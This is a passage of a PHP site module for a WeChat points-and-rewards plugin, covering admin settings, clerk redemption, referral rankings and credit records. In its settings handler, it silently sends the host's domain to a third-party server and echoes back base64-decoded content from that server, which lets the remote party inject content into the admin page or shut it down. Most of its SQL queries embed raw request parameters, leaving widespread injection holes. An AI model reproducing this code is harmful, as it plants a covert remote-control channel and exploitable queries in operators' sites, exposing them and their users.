<?php

defined ('IN_IA') or exit ('Access Denied');
require_once IA_ROOT . '/addons/wdl_jifenbao/lib/excel.php';
class Wdl_jifenbaoModuleSite extends WeModuleSite{
    public $table_request = "wdl_jifenbao_request";
    public $table_goods = "wdl_jifenbao_goods";
    public $table_ad = "wdl_jifenbao_ad";
    private static $t_sys_member = 'mc_members';
    public function getmainhuo(){
        $host = $_SERVER['HTTP_HOST'];
        $host = strtolower($host);
        if(strpos($host, '/') !== false){
            $parse = @parse_url($host);
            $host = $parse['host'];
        }
        $topleveldomaindb = array('com', 'edu', 'gov', 'int', 'mil', 'net', 'org', 'biz', 'info', 'pro', 'name', 'museum', 'coop', 'aero', 'xxx', 'idv', 'mobi', 'cc', 'me', 'xin');
        $str = '';
        foreach($topleveldomaindb as $v){
            $str .= ($str ? '|' : '') . $v;
        }
        $matchstr = "[^\.]+\.(?:(" . $str . ")|\w{2}|((" . $str . ")\.\w{2}))$";
        if(preg_match("/" . $matchstr . "/ies", $host, $matchs)){
            $domain = $matchs['0'];
        }else{
            $domain = $host;
        }
        return $domain;
    }
    public function doWebSet(){
        $this -> getsq();
		$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
        global $_W, $_GPC;
        $weid = $_W['uniacid'];
        $set = pdo_fetch ('select * from ' . tablename ($this -> modulename . "_set") . " where weid='{$weid}'");
        if(empty($set)){
            if (checksubmit('submit')){
                $indata = array('weid' => $_W['uniacid'], 'hbsum' => $_GPC['hbsum'], 'hbtext' => $_GPC['hbtext'],);
                $result = pdo_insert($this -> modulename . "_set", $indata);
                if(empty($result)){
                    message ('添加失败');
                }else{
                    message ('添加成功!');
                }
            }
        }else{
            if (checksubmit('submit')){
                $id = intval($_GPC['id']);
                $updata = array('hbsum' => $_GPC['hbsum'], 'hbtext' => $_GPC['hbtext'],);
                if(pdo_update($this -> modulename . "_set", $updata, array('id' => $id)) === false){
                    message ('更新失败');
                }else{
                    message ('更新成功!');
                }
            }
        }
        include $this -> template ('set');
    }
    public function doWebDianyuan(){
        $this -> getsq();
        global $_W, $_GPC;
        $do = 'dianyuan';
        include $this -> template ('dianyuan');
    }
    public function doWebDianyuandel(){
        global $_W, $_GPC;
        $del = pdo_delete($this -> modulename . "_dianyuan", array('id' => $_GPC['id']));
        if($del){
            message ('删除成功', $this -> createWebUrl ('dianyuangl'));
        }
    }
    public function doWebDianyuangl(){
        $this -> getsq();
        global $_W, $_GPC;
        $do = 'dianyuangl';
        $list = pdo_fetchall("select * from" . tablename($this -> modulename . "_dianyuan") . " where weid='{$_W['uniacid']}' order by id desc");
        include $this -> template ('dianyuangl');
    }
    public function doWebHexiao(){
        $this -> getsq();
        global $_W, $_GPC;
        $do = 'hexiao';
        $list = pdo_fetchall("select * from" . tablename($this -> modulename . "_hexiao") . " where weid='{$_W['uniacid']}' order by id desc");
        include $this -> template ('hexiao');
    }
    public function doMobileHexiao(){
        global $_W, $_GPC;
        $password = $_GPC['password'];
        if($password){
            $clerk = pdo_fetch("select * from" . tablename($this -> modulename . "_dianyuan") . " where weid='{$_W['uniacid']}' and password='{$password}'");
            if($clerk){
                $data = array ('weid' => $_W ['uniacid'], 'dianyanid' => $clerk ['dianyanid'], 'openid' => $_GPC ['openid'], 'nickname' => $_GPC ['nickname'], 'ename' => $clerk ['ename'], 'companyname' => $clerk ['companyname'], 'goodname' => $_GPC ['goodname'], 'goodid' => $_GPC ['goodid'], 'createtime' => time());
                pdo_insert ($this -> modulename . "_hexiao", $data);
                $dataab = array('status' => 'done');
                $id = intval($_GPC ['goodid']);
                if(pdo_update($this -> table_request, $dataab, array('id' => $id))){
                    message('消费成功', $this -> createMobileUrl('request'));
                }else{
                    message('消费失败', $this -> createMobileUrl('request'), 'error');
                }
            }else{
                message('密码填写错误', $this -> createMobileUrl('request'), 'error');
            }
        }else{
            message('请填写消费密码', $this -> createMobileUrl('request'), 'error');
        }
    }
    public function doWebDianyuanadd(){
        global $_W, $_GPC;
        $do = 'dianyuanadd';
        $id = $_GPC['id'];
        $op = $_GPC['op'];
        if($id){
            $clerk = pdo_fetch("select * from" . tablename($this -> modulename . "_dianyuan") . " where weid='{$_W['uniacid']}' and id={$id}");
        }
        if($op == 'adde'){
            $list = pdo_fetchall("select * from" . tablename($this -> modulename . "_dianyuan") . " where password='{$_GPC['password']}'");
            if($list){
                message ('店员密码不能重复', $this -> createWebUrl ('dianyuanadd'), 'error');
            }
            $data = array ('weid' => $_W ['uniacid'], 'openid' => $_GPC ['openid'], 'nickname' => $_GPC ['nickname'], 'ename' => $_GPC ['ename'], 'tel' => $_GPC ['tel'], 'password' => $_GPC ['password'], 'companyname' => $_GPC ['companyname'], 'nickname' => $_GPC ['nickname'], 'createtime' => time());
            if($id){
                if(pdo_update($this -> modulename . "_dianyuan", $data, array ('id' => $id))){
                    message ('编辑成功！', $this -> createWebUrl ('dianyuangl'));
                }else{
                    message ('添加失败！');
                }
            }
            if(pdo_insert ($this -> modulename . "_dianyuan", $data)){
                message ('添加成功！', $this -> createWebUrl ('dianyuangl'));
            }else{
                message ('添加失败！');
            }
        }
        include $this -> template ('dianyuangl');
    }
    public function doWebRecord(){
        $this -> getsq();
        global $_W, $_GPC;
        $pid = $_GPC['pid'];
        $pindex = max(1, intval($_GPC['page']));
        $psize = 20;
        $list = pdo_fetchall("select * from " . tablename($this -> modulename . "_record") . " where pid='{$pid}' LIMIT " . ($pindex - 1) * $psize . ",{$psize}");
        load() -> model('mc');
        foreach ($list as $key => $value){
            $mc = mc_fetch($value['openid']);
            $list[$key]['nickname'] = $mc['nickname'];
            $list[$key]['avatar'] = $mc['avatar'];
        }
        $total = pdo_fetchcolumn("SELECT COUNT(*) FROM " . tablename($this -> modulename . '_record') . " where pid='{$pid}'");
        $pager = pagination($total, $pindex, $psize);
        include $this -> template ('record');
    }
    public function doWebShare(){
        $this -> getsq();
        global $_W, $_GPC;
        $sid = $_GPC['sid'];
        $cid = $_GPC['cid'];
        $pid = $_GPC['pid'];
        $name = $_GPC['name'];
        $uid = $_GPC['uid'];
        $weid = $_W['uniacid'];
        $status = intval($_GPC['status']);
        if (!empty($sid)){
            $where = " and helpid='{$sid}'";
        }elseif (!empty($cid)){
            $c = pdo_fetchall('select openid from ' . tablename($this -> modulename . "_share") . " where weid='{$_W['uniacid']}' and helpid='{$cid}'", array(), 'openid');
            $fid = implode(',', array_keys($c));
            if(!$fid){
                $fid = '999999999';
            }
            $where = " and weid='{$_W['uniacid']}' and helpid in (" . $fid . ")";
        }
        if (!empty($name)) $where .= " and (nickname like '%{$name}%' or openid = '{$name}') ";
        $pindex = max(1, intval($_GPC['page']));
        $psize = 10;
        $credit = pdo_fetchcolumn('select credit from ' . tablename($this -> modulename . "_poster") . " where id='{$pid}'");
        $credit = $credit?'credit2':'credit1';
        $list = pdo_fetchall("select *,(select credit1 from " . tablename('mc_members') . " where uid=s.openid ) as surplus,(select followtime from " . tablename('mc_mapping_fans') . " where uid=s.openid and follow='1') as follow from " . tablename($this -> modulename . "_share") . " s where openid<>'' and weid='{$_W['uniacid']}' and status={$status} {$where} order by createtime desc LIMIT " . ($pindex - 1) * $psize . ",{$psize}");
        load() -> model('mc');
        foreach ($list as $key => $value){
            $mc = mc_fetch($value['openid']);
            $list[$key]['nickname'] = $mc['nickname'];
            $list[$key]['avatar'] = $mc['avatar'];
            if (empty($value['province'])){
                $list[$key]['province'] = $mc['resideprovince'];
                $list[$key]['city'] = $mc['residecity'];
                pdo_update($this -> modulename . "_share", array('province' => $mc['resideprovince'], 'city' => $mc['residecity']), array('id' => $value['id']));
            }
            $c = pdo_fetchall('select openid from ' . tablename($this -> modulename . "_share") . " where weid='{$_W['uniacid']}' and openid<>'' and helpid='{$value['openid']}'", array(), 'openid');
            $list[$key]['l1'] = count($c);
            if ($c){
                $list[$key]['l2'] = pdo_fetchcolumn('select count(id) from ' . tablename($this -> modulename . "_share") . " where weid='{$_W['uniacid']}' and openid<>'' and helpid in (" . implode(',', array_keys($c)) . ")");
            }else $list[$key]['l2'] = 0;
        }
        $total = pdo_fetchcolumn("SELECT COUNT(*) FROM " . tablename($this -> modulename . '_share') . " where weid='{$_W['uniacid']}' and openid<>'' and status={$status} {$where}");
        $pager = pagination($total, $pindex, $psize);
        $type = pdo_fetchcolumn("select type from " . tablename($this -> modulename . "_poster") . " where weid='{$weid}' ");
        include $this -> template ('share');
    }
    public function doWebStatus(){
        global $_W, $_GPC;
        $sid = $_GPC['sid'];
        $pid = $_GPC['pid'];
        if ($_GPC['status']){
            if (pdo_update($this -> modulename . "_share", array('status' => 0), array('id' => $sid)) === false){
                message('恢复失败！');
            }else message('恢复成功！', $this -> createWebUrl('share', array('pid' => $pid, 'status' => 1)));
        }else{
            if (pdo_update($this -> modulename . "_share", array('status' => 1), array('id' => $sid)) === false){
                message('拉黑失败！');
            }else message('拉黑成功！', $this -> createWebUrl('share', array('pid' => $pid)));
        }
    }
    public function doWebDelete(){
        global $_W, $_GPC;
        $sid = $_GPC['sid'];
        $pid = $_GPC['pid'];
        if(!empty($_GPC['sceneid'])){
            pdo_delete("qrcode", array('uniacid' => $_W['uniacid'], 'qrcid' => $_GPC['sceneid']));
        }
        pdo_delete($this -> modulename . "_share", array('id' => $sid));
        pdo_update($this -> modulename . "_share", array('helpid' => 0), array('helpid' => $sid));
        @unlink("../addons/wdl_jifenbao/qrcode/mposter{$sid}.jpg");
        message('删除成功！', $this -> createWebUrl('share', array('pid' => $pid, 'status' => $_GPC['status'])));
    }
    public function doMobileScore(){
        global $_W, $_GPC;
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $openid = $_W['fans']['from_user'];
        if (!strpos($userAgent, 'MicroMessenger')){
            message('请使用微信浏览器打开！');
            $openid = 'opk4HsyhyQpJvVAUhA6JGhdMSImo';
        }
        $pid = $_GPC['pid'];
        $items = pdo_fetch ('select * from ' . tablename ($this -> modulename . "_poster") . " where id='{$pid}'");
        $name = $items['credit']?'余额':'积分';
        if (empty($items) && $items['type'] != 1) die('扫码送' . $name . '活动已经结束！');
        $sliders = unserialize($items['sliders']);
        $atimes = '';
        foreach ($sliders as $key => $value){
            $atimes[$key] = $value['displayorder'];
        }
        array_multisort($atimes, SORT_NUMERIC, SORT_DESC, $sliders);
        $follow = pdo_fetchcolumn('select follow from ' . tablename("mc_mapping_fans") . " where openid='{$openid}'");
        $record = pdo_fetch('select * from ' . tablename($this -> modulename . "_record") . " where openid='{$openid}' and pid='{$pid}'");
        $items['score3'] = $items['score'];
        if ($items['score2']){
            $items['score1'] = $items['score'] . "—" . $items['score2'] . " ";
            $items['score3'] = intval(mt_rand($items['score'], $items['score2']));
        }
        $cfg = $this -> module['config'];
        include $this -> template ('qrcode');
    }
    public function doMobileAjaxrank(){
        global $_W, $_GPC;
        $weid = $_GPC['weid'];
        $last = $_GPC['last'];
        $amount = $_GPC['amount'];
        $shares = pdo_fetchall("select m.nickname,m.avatar,m.credit1 FROM " . tablename('mc_members') . " m LEFT JOIN " . tablename('mc_mapping_fans') . " f ON m.uid=f.uid where f.follow=1 and f.uniacid='{$weid}' and m.credit1<>0 order by credit1 desc limit $last,$amount");
        echo json_encode($shares);
    }
    public function doMobileRanking(){
        global $_W, $_GPC;
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        if (!strpos($userAgent, 'MicroMessenger')){
            message('请使用微信浏览器打开！');
        }else{
            load() -> model('mc');
            $fans = $_W['fans'];
            $fans['avatar'] = $fans['tag']['avatar'];
            $fans['nickname'] = $fans['tag']['nickname'];
        }
        $weid = $_GPC['i'];
        $poster = pdo_fetch ('select * from ' . tablename ($this -> modulename . "_poster") . " where weid='{$weid}'");
        $credit = 0;
        $creditname = '积分';
        $credittype = 'credit1';
        if ($poster['credit']){
            $creditname = '余额';
            $credittype = 'credit2';
        }
        if ($fans){
            $mc = mc_credit_fetch($fans['uid'], array($credittype));
            $credit = $mc[$credittype];
        }
        $fans1 = pdo_fetchall("select s.openid from " . tablename($this -> modulename . "_share") . " s left join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid='{$fans['uid']}' and f.follow=1 and s.openid<>''", array(), 'openid');
        $count = count($fans1);
        if ($fans1){
            $count2 = pdo_fetchcolumn("select count(*) from " . tablename($this -> modulename . "_share") . " s left join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid in (" . implode(',', array_keys($fans1)) . ") and f.follow=1");
            if (empty($count2)) $count2 = 0;
        }
        $sumcount = $count;
        $rank = $poster['slideH'];
        if(empty($rank)){
            $rank = 20;
        }
        $cfg = $this -> module['config'];
        $shares = pdo_fetchall("select m.nickname,m.avatar,m.credit1,m.uid from" . tablename('mc_members') . " m inner join " . tablename('mc_mapping_fans') . " f on m.uid=f.uid and m.nickname<>'' and f.follow=1 and f.uniacid='{$weid}' order by m.credit1 desc limit {$rank}");
        foreach($shares as $k => $v){
            $txsum = pdo_fetch('select SUM(num) tx from ' . tablename('mc_credits_record') . ' where uniacid=:uniacid and uid=:uid and credittype=:credittype and num<:num', array(':uniacid' => $_W['uniacid'], ':uid' => $shares[$k]['uid'], ':credittype' => 'credit1', ':num' => 0));
            if(empty($txsum['tx'])){
                $shares[$k]['credit3'] = 0;
            }else{
                $shares[$k]['credit3'] = $txsum['tx'] * -1;
            }
        }
        $cfg = $this -> module['config'];
        if($cfg['paihang'] == 1){
            foreach ($shares as $key => $value){
                $nickname[$key] = $value['nickname'];
                $avatar[$key] = $value['avatar'];
                $credit2[$key] = $value['credit2'];
                $uid[$key] = $value['uid'];
                $credit3[$key] = $value['credit3'];
            }
            array_multisort($credit3, SORT_NUMERIC, SORT_DESC, $uid, SORT_STRING, SORT_ASC, $shares);
        }
        $mbstyle = $poster['mbstyle'];
        include $this -> template ($mbstyle . '/ranking');
    }
    public function doMobileTxranking(){
        global $_W, $_GPC;
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        if (!strpos($userAgent, 'MicroMessenger')){
            message('请使用微信浏览器打开！');
        }else{
            load() -> model('mc');
            $fans = $_W['fans'];
            $fans['avatar'] = $fans['tag']['avatar'];
            $fans['nickname'] = $fans['tag']['nickname'];
        }
        $weid = $_GPC['i'];
        $poster = pdo_fetch ('select * from ' . tablename ($this -> modulename . "_poster") . " where weid='{$weid}'");
        $credit = 0;
        $creditname = '积分';
        $credittype = 'credit2';
        if ($poster['credit']){
            $creditname = '余额';
            $credittype = 'credit2';
        }
        if ($fans){
            $mc = mc_credit_fetch($fans['uid'], array($credittype));
            $credit = $mc[$credittype];
        }
        $fans1 = pdo_fetchall("select s.openid from " . tablename($this -> modulename . "_share") . " s left join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid='{$fans['uid']}' and f.follow=1 and s.openid<>''", array(), 'openid');
        $count = count($fans1);
        if ($fans1){
            $count2 = pdo_fetchcolumn("select count(*) from " . tablename($this -> modulename . "_share") . " s left join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid in (" . implode(',', array_keys($fans1)) . ") and f.follow=1");
            if (empty($count2)) $count2 = 0;
        }
        $sumcount = $count;
        $rank = $poster['slideH'];
        if(empty($rank)){
            $rank = 20;
        }
        $cfg = $this -> module['config'];
        $shares = pdo_fetchall("select m.nickname,m.avatar,m.credit2,m.uid from" . tablename('mc_members') . " m inner join " . tablename('mc_mapping_fans') . " f on m.uid=f.uid and f.follow=1 and f.uniacid='{$weid}' order by m.credit2 desc limit {$rank}");
        foreach($shares as $k => $v){
            $txsum = pdo_fetch('select SUM(num) tx from ' . tablename('mc_credits_record') . ' where uniacid=:uniacid and uid=:uid and credittype=:credittype and num<:num', array(':uniacid' => $_W['uniacid'], ':uid' => $shares[$k]['uid'], ':credittype' => 'credit2', ':num' => 0));
            if(empty($txsum['tx'])){
                $shares[$k]['credit3'] = 0;
            }else{
                $shares[$k]['credit3'] = $txsum['tx'] * -1;
            }
        }
        $cfg = $this -> module['config'];
        if($cfg['paihang'] == 1){
            foreach ($shares as $key => $value){
                $nickname[$key] = $value['nickname'];
                $avatar[$key] = $value['avatar'];
                $credit2[$key] = $value['credit2'];
                $uid[$key] = $value['uid'];
                $credit3[$key] = $value['credit3'];
            }
            array_multisort($credit3, SORT_NUMERIC, SORT_DESC, $uid, SORT_STRING, SORT_ASC, $shares);
        }
        $mbstyle = $poster['mbstyle'];
        include $this -> template ('tixian/txranking');
    }
    public function doMobileHbshare(){
        global $_W, $_GPC;
        $pid = $_GPC['pid'];
        $weid = $_W['uniacid'];
        $cfg = $this -> module['config'];
        $poster = pdo_fetch ('select * from ' . tablename ($this -> modulename . "_poster") . " where weid='{$weid}'");
        $type = $_GPC['type'];
        $id = $_GPC['id'];
        $img = $_W['siteroot'] . 'addons/wdl_jifenbao/qrcode/mposter' . $id . '.jpg';
        $mbstyle = $poster['mbstyle'];
        include $this -> template ($mbstyle . '/hbshare');
    }
    public function doMobileRecords(){
        global $_W, $_GPC;
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        if (!strpos($userAgent, 'MicroMessenger')){
            message('请使用微信浏览器打开！');
        }else{
            load() -> model('mc');
            $fans = $_W['fans'];
            $fans['avatar'] = $fans['tag']['avatar'];
            $fans['nickname'] = $fans['tag']['nickname'];
        }
        $pid = $_GPC['pid'];
        $weid = $_GPC['i'];
        $poster = pdo_fetch ('select * from ' . tablename ($this -> modulename . "_poster") . " where weid='{$weid}'");
        $credit = 0;
        $creditname = '积分';
        $credittype = 'credit1';
        if ($poster['credit']){
            $creditname = '余额';
            $credittype = 'credit2';
        }
        if ($fans){
            $mc = mc_credit_fetch($fans['uid'], array($credittype));
            $credit = $mc[$credittype];
        }
        $fans1 = pdo_fetchall("select s.openid from " . tablename($this -> modulename . "_share") . " s left join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid='{$fans['uid']}' and f.follow=1 and s.openid<>''", array(), 'openid');
        $count = count($fans1);
        $count2 = 0;
        if ($fans1){
            $count2 = pdo_fetchcolumn("select count(*) from " . tablename($this -> modulename . "_share") . " s left join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid in (" . implode(',', array_keys($fans1)) . ") and f.follow=1");
            if (empty($count2)) $count2 = 0;
        }
        $cfg = $this -> module['config'];
        $sumcount = $count;
        $cfg = $this -> module['config'];
        $records = pdo_fetchall('select * from ' . tablename('mc_credits_record') . " where uid='{$fans['uid']}' and credittype='credit1' order by createtime desc limit 20");
        $mbstyle = $poster['mbstyle'];
        include $this -> template ($mbstyle . '/records');
    }
    public function doMobileTxrecords(){
        global $_W, $_GPC;
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        if (!strpos($userAgent, 'MicroMessenger')){
            message('请使用微信浏览器打开！');
        }else{
            load() -> model('mc');
            $fans = $_W['fans'];
            $fans['avatar'] = $fans['tag']['avatar'];
            $fans['nickname'] = $fans['tag']['nickname'];
        }
        $pid = $_GPC['pid'];
        $weid = $_GPC['i'];
        $poster = pdo_fetch ('select * from ' . tablename ($this -> modulename . "_poster") . " where weid='{$weid}'");
        $credit = 0;
        $creditname = '积分';
        $credittype = 'credit2';
        if ($poster['credit']){
            $creditname = '余额';
            $credittype = 'credit2';
        }
        if ($fans){
            $mc = mc_credit_fetch($fans['uid'], array($credittype));
            $credit = $mc[$credittype];
        }
        $fans1 = pdo_fetchall("select s.openid from " . tablename($this -> modulename . "_share") . " s left join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid='{$fans['uid']}' and f.follow=1 and s.openid<>''", array(), 'openid');
        if ($fans1){
            $count2 = pdo_fetchcolumn("select count(*) from " . tablename($this -> modulename . "_share") . " s  join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid in (" . implode(',', array_keys($fans1)) . ") and f.follow=1");
        }
        if (empty($count2)){
            $count2 = 0;
        }
        $count = count($fans1);
        $sumcount = $count;
        $cfg = $this -> module['config'];
        $records = pdo_fetchall('select * from ' . tablename('mc_credits_record') . " where uid='{$fans['uid']}' and credittype='credit2' order by createtime desc limit 20");
        $mbstyle = $poster['mbstyle'];
        include $this -> template ('tixian/txrecords');
    }
    public function doMobileMFan1(){
        global $_W, $_GPC;
        $pid = $_GPC['pid'];
        $uid = $_GPC['uid'];
        $level = $_GPC['level'];
        $cfg = $this -> module['config'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        if (!strpos($userAgent, 'MicroMessenger')){
            message('请使用微信浏览器打开！');
        }else{
            load() -> model('mc');
            $fans = $_W['fans'];
            $fans['avatar'] = $fans['tag']['avatar'];
            $fans['nickname'] = $fans['tag']['nickname'];
        }
        $pid = $_GPC['pid'];
        $weid = $_GPC['i'];
        $poster = pdo_fetch ('select * from ' . tablename ($this -> modulename . "_poster") . " where weid='{$weid}'");
        $credit = 0;
        $creditname = '积分';
        $credittype = 'credit1';
        if ($poster['credit']){
            $creditname = '余额';
            $credittype = 'credit2';
        }
        if ($fans){
            $mc = mc_credit_fetch($fans['uid'], array($credittype));
            $credit = $mc[$credittype];
        }
        $fans1 = pdo_fetchall("select s.openid from " . tablename($this -> modulename . "_share") . " s join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid='{$fans['uid']}' and f.follow=1 and s.openid<>''", array(), 'openid');
        $count = count($fans1);
        if ($fans1){
            $count2 = pdo_fetchcolumn("select count(*) from " . tablename($this -> modulename . "_share") . " s  join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid in (" . implode(',', array_keys($fans1)) . ") and f.follow=1");
        }
        if (empty($count2)){
            $count2 = 0;
        }
        $sumcount = $count;
        $credittype = 'credit1';
        if ($poster['credit']){
            $credittype = 'credit2';
        }
        $fans1 = pdo_fetchall("select m.{$credittype} as credit,m.nickname,m.avatar,s.openid,m.createtime from " . tablename($this -> modulename . "_share") . " s join " . tablename('mc_members') . " m on s.openid=m.uid join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid='{$uid}' and f.follow=1 order by m.{$credittype} desc");
        $mbstyle = $poster['mbstyle'];
        include $this -> template ($mbstyle . '/mfan1');
    }
    public function doMobileTxmfan1(){
        global $_W, $_GPC;
        $pid = $_GPC['pid'];
        $uid = $_GPC['uid'];
        $level = $_GPC['level'];
        $cfg = $this -> module['config'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        if (!strpos($userAgent, 'MicroMessenger')){
            message('请使用微信浏览器打开！');
        }else{
            load() -> model('mc');
            $fans = $_W['fans'];
            $fans['avatar'] = $fans['tag']['avatar'];
            $fans['nickname'] = $fans['tag']['nickname'];
        }
        $pid = $_GPC['pid'];
        $weid = $_GPC['i'];
        $poster = pdo_fetch ('select * from ' . tablename ($this -> modulename . "_poster") . " where weid='{$weid}'");
        $credit = 0;
        $creditname = '积分';
        $credittype = 'credit2';
        if ($poster['credit']){
            $creditname = '余额';
            $credittype = 'credit2';
        }
        if ($fans){
            $mc = mc_credit_fetch($fans['uid'], array($credittype));
            $credit = $mc[$credittype];
        }
        $fans1 = pdo_fetchall("select s.openid from " . tablename($this -> modulename . "_share") . " s join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid='{$fans['uid']}' and f.follow=1 and s.openid<>''", array(), 'openid');
        $count = count($fans1);
        if ($fans1){
            $count2 = pdo_fetchcolumn("select count(*) from " . tablename($this -> modulename . "_share") . " s  join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid in (" . implode(',', array_keys($fans1)) . ") and f.follow=1");
        }
        if (empty($count2)){
            $count2 = 0;
        }
        $sumcount = $count;
        $credittype = 'credit2';
        if ($poster['credit']){
            $credittype = 'credit2';
        }
        $fans1 = pdo_fetchall("select m.{$credittype} as credit,m.nickname,m.avatar,s.openid,m.createtime from " . tablename($this -> modulename . "_share") . " s join " . tablename('mc_members') . " m on s.openid=m.uid join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid='{$uid}' and f.follow=1 order by m.{$credittype} desc");
        $mbstyle = $poster['mbstyle'];
        include $this -> template ('tixian/txmfan1');
    }
    public function doMobileMFan2(){
        global $_W, $_GPC;
        $pid = $_GPC['pid'];
        $uid = $_GPC['uid'];
        $weid = $_GPC['i'];
        $level = $_GPC['level'];
        $cfg = $this -> module['config'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        if (!strpos($userAgent, 'MicroMessenger')){
            message('请使用微信浏览器打开！');
        }else{
            load() -> model('mc');
            $fans = $_W['fans'];
            $fans['avatar'] = $fans['tag']['avatar'];
            $fans['nickname'] = $fans['tag']['nickname'];
        }
        $pid = $_GPC['pid'];
        $poster = pdo_fetch ('select * from ' . tablename ($this -> modulename . "_poster") . " where weid='{$weid}'");
        $credit = 0;
        $creditname = '积分';
        $credittype = 'credit1';
        if ($poster['credit']){
            $creditname = '余额';
            $credittype = 'credit2';
        }
        if ($fans){
            $mc = mc_credit_fetch($fans['uid'], array($credittype));
            $credit = $mc[$credittype];
        }
        $fans1 = pdo_fetchall("select s.openid from " . tablename($this -> modulename . "_share") . " s join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid='{$fans['uid']}' and f.follow=1 and s.openid<>''", array(), 'openid');
        $count = count($fans1);
        if ($fans1){
            $count2 = pdo_fetchcolumn("select count(*) from " . tablename($this -> modulename . "_share") . " s  join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid in (" . implode(',', array_keys($fans1)) . ") and f.follow=1");
        }
        if (empty($count2)){
            $count2 = 0;
        }
        $sumcount = $count;
        $credittype = 'credit1';
        if ($poster['credit']){
            $credittype = 'credit2';
        }
        $fans1 = pdo_fetchall("select m.{$credittype} as credit,m.nickname,m.avatar,s.openid from " . tablename($this -> modulename . "_share") . " s join " . tablename('mc_members') . " m on s.openid=m.uid join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid='{$uid}' and f.follow=1 order by m.{$credittype} desc");
        $ids = array();
        foreach ($fans1 as $value){
            $ids[] = $value['openid'];
        }
        if ($ids && $level == 1){
            $fans2 = pdo_fetchall("select m.{$credittype} as credit,m.nickname,m.avatar,m.createtime from " . tablename($this -> modulename . "_share") . " s join " . tablename('mc_members') . " m on s.openid=m.uid join " . tablename('mc_mapping_fans') . " f on s.openid=f.uid where s.weid='{$weid}' and s.helpid in (" . implode(',', $ids) . ") and f.follow=1 order by m.{$credittype} desc");
        }
        $mbstyle = $poster['mbstyle'];
        include $this -> template ($mbstyle . '/mfan2');
    }
    public function doWebGoods(){
        $this -> getsq();
        global $_W;
        global $_GPC;
        load () -> func ('tpl');
        $operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
        if ($operation == 'post'){
            $goods_id = intval($_GPC['goods_id']);
            if (!empty($goods_id)){
                $item = pdo_fetch("SELECT * FROM " . tablename($this -> table_goods) . " WHERE goods_id = :goods_id" , array(':goods_id' => $goods_id));
                if (empty($item)){
                    message('抱歉，兑换商品不存在或是已经删除！', '', 'error');
                }
            }
            if (checksubmit('submit')){
                if (empty($_GPC['title'])){
                    message('请输入兑换商品名称！');
                }
                if (empty($_GPC['cost'])){
                    message('请输入兑换商品需要消耗的积分数量！');
                }
                if (empty($_GPC['price'])){
                    message('请输入商品实际价值！');
                }
                $cost = intval($_GPC['cost']);
                $price = intval($_GPC['price']);
                $vip_require = intval($_GPC['vip_require']);
                $amount = intval($_GPC['amount']);
                $type = intval($_GPC['type']);
                $per_user_limit = intval($_GPC['per_user_limit']);
                $data = array('weid' => $_W['weid'], 'title' => $_GPC['title'], 'px' => $_GPC['px'], 'shtype' => $_GPC['shtype'], 'logo' => $_GPC['logo'], 'starttime' => strtotime($_GPC ['starttime']), 'endtime' => strtotime($_GPC ['endtime']), 'amount' => $amount, 'cardid' => $_GPC['cardid'], 'per_user_limit' => intval($per_user_limit), 'vip_require' => $vip_require, 'cost' => $cost, 'day_sum' => $_GPC['day_sum'], 'price' => $price, 'type' => $type, 'hot' => $_GPC['hot'], 'hotcolor' => $_GPC['hotcolor'], 'dj_link' => $_GPC['dj_link'], 'appurl' => $_GPC['appurl'], 'wl_link' => $_GPC['wl_link'], 'content' => $_GPC['content'], 'createtime' => TIMESTAMP,);
                if (!empty($goods_id)){
                    pdo_update($this -> table_goods, $data, array('goods_id' => $goods_id));
                }else{
                    pdo_insert($this -> table_goods, $data);
                }
                message('商品更新成功！', $this -> createWebUrl('goods', array('op' => 'display')), 'success');
            }
        }else if ($operation == 'delete'){
            $goods_id = intval($_GPC['goods_id']);
            $row = pdo_fetch("SELECT goods_id FROM " . tablename($this -> table_goods) . " WHERE goods_id = :goods_id", array(':goods_id' => $goods_id));
            if (empty($row)){
                message('抱歉，商品' . $goods_id . '不存在或是已经被删除！');
            }
            pdo_delete($this -> table_goods, array('goods_id' => $goods_id));
            message('删除成功！', referer(), 'success');
        }else if ($operation == 'display'){
            if (checksubmit()){
                if (!empty($_GPC['displayorder'])){
                    foreach ($_GPC['displayorder'] as $id => $displayorder){
                        pdo_update($this -> table_goods, array('displayorder' => $displayorder), array('goods_id' => $id));
                    }
                    message('排序更新成功！', referer(), 'success');
                }
            }
            $condition = '';
